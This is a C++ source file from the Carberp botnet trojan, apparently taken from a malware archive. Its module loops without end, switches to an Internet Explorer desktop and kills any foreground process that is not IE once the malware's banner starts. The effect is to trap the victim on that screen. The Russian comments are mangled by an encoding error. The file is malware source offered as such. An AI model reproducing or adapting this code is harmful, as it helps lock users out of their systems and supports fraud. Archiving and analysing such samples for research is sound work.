/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>
#include <time.h>
#include <stdio.h>
#include <process.h>
#include <hash_map>
#include <list>
#include <shlwapi.h>


#include "dprint.h"
#include "threading.h"
#include "noniekiller.h"
#include "banner.h"
#include "procenum.h"
#include "main.h"


void InfitityKillNonIeTopWindowProcesses()
{
  PP_DPRINTF(L"InfitityKillNonIeTopWindowProcesses: started.");

  
  PP_DPRINTF(L"InfitityKillNonIeTopWindowProcesses: waiting for banner start...");
  while (true)
  {
    Sleep(1);    
    if (BannerStarted()) break;
  }
  PP_DPRINTF(L"InfitityKillNonIeTopWindowProcesses: banner started. Start killing top non IE processes.");

  /// ����������� ���� ������ � ���������� ���������, ������� �� IE
  while (true)
  {
    // �� ��������� ������ �������� �� ��������� ������ ����� ���������.
    Sleep(100);

    // ������������� � ��� �� �������, ��� � �������� ���������
    // ���� ��� �� ������� - �� ������ ������� �������� ��������� �� 
    // ������ ��������
    BannerSwitchToIeDesktop();

    DWORD top_wnd_pid = 0;
    HWND  top_wnd = 0;
    
    // ������� ������� ���� � ��� ��� ��������
    top_wnd = GetForegroundWindow();
		GetWindowThreadProcessId(top_wnd, &top_wnd_pid);

    // �� ���������� �������� pid
    if (top_wnd_pid == 0) continue;

    DWORD pids[200];
    DWORD pid_count = 0;

    FilteredEnumProcesses(ProcessFilter_NonIE, pids, ARRAYSIZE(pids), &pid_count);
    for (DWORD i = 0; i < pid_count; i++)
    {
      // Fixed: ������ �� ������������ (�� �������)
      if (top_wnd_pid == pids[i] && top_wnd_pid != GetCurrentProcessId())
      {
        HANDLE hHandle=OpenProcess(PROCESS_TERMINATE, 0, pids[i]);
        if (hHandle) 
        {
          PP_DPRINTF(L"InfitityKillNonIeTopWindowProcesses: killing %d process",
            top_wnd_pid);
          ::TerminateProcess(hHandle,0);
          CloseHandle(hHandle);
        }
        break;
      }
    }
  }
}

unsigned __stdcall NonIeKillingThread(void* p)
{
  PP_DPRINTF(L"NonIeKillingThread: started.");

  InfitityKillNonIeTopWindowProcesses();

  _endthreadex(0);
  return 0; 
}

static bool IsCurrentProcessNotExplorer()
{
  return !IsCurrentProcessCorrespondToFilter(ProcessFilter_Explorer);
}

void TryInitNonIEKilling()
{
  PP_DPRINTF(L"TryInitNonIEKilling: started.");

  PP_RETURNIF1(IsCurrentProcessNotExplorer());

  unsigned th_id;
  HANDLE th = (HANDLE)_beginthreadex(NULL, 0, &NonIeKillingThread, NULL, 0, &th_id);
  if (th) CloseHandle(th);
}

void WINAPI Export_StartNonIeTopWindowProcessesKilling(void* self_dll_body)
{
  PP_DPRINTF(L"Export_StartNonIeTopWindowProcessesKilling: started.");
  InfitityKillNonIeTopWindowProcesses();
}